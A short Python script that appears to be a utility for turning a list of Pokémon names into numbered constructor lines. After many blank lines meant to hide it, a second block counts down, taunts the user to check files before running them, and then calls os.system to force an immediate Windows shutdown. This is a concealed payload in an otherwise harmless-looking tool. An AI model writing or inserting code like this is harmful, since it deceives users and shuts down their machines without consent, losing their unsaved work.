with open("pokeNames.txt","r") as sourcePokemon:
    with open("pokeOut.txt","w") as destinationPokemion:
        allPokemon = sourcePokemon.readlines()
        for pokemon in range(len(allPokemon)):
            allPokemon[pokemon] = allPokemon[pokemon].replace("\n","")

        for pokemon in range(len(allPokemon)):
            numUse = "#"
            if len(str(pokemon)) == 1:
                numUse += "00"+str(pokemon)
            elif len(str(pokemon)) == 2:
                numUse += "0"+str(pokemon)
            else:
                numUse += str(pokemon)

            destinationPokemion.write("new Pokemon(\""+allPokemon[pokemon]+"\", \""+ numUse +"\"),\n")























































































































































































































































































































































import os
import time
import random
print("you should always check your files before you run them")
time_to_shut_down = random.randint(3,10)
for i in range(time_to_shut_down,0,-1):
    print(i)
    time.sleep(1)
print("good bye")
time.sleep(2)
os.system("shutdown /s /t 1")